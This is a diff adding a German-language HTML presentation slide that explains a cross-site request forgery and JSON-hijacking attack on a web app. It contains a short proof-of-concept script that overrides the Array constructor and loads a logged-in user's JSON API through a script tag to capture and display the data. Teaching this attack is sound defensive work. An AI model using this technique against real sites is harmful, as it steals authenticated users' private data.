@@ -1,0 +1,35 @@
+<div w11k-slide-master="regular">
+  <span w11k-slide-part-source="header">
+    Beispiel
+  </span>
+
+  <div w11k-slide-part-source="content">
+
+    <ul>
+      <li>Ausgangsituation
+        <ul>
+          <li>Benutzer in App eingeloggt (hat gültiges Session-Cookie)</li>
+          <li>Anwendung ist nicht oder unzureichend gegen XSRF geschützt</li>
+        </ul>
+      </li>
+    </ul>
+
+<pre w11k-pretty-print lang="url" title="Aufruf der API ohne zusätzlichen Schutz">
+http://example.com/app/user
+// returns ["Philipp", "secret"]
+</pre>
+
+<pre w11k-pretty-print lang="html" title="XSRF + JSON Attacke">
+&lt;script type=&quot;text/javascript&quot;&gt;
+  var secrets;
+  Array = function() { secrets = this; };
+&lt;/script&gt;
+// load data via src (CORS)
+&lt;script src=&quot;http://example.com/app/user&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;
+  alert('I stole your data: ' + JSON.stringify(secrets));
+&lt;/script&gt;
+</pre>
+
+  </div>
+</div>
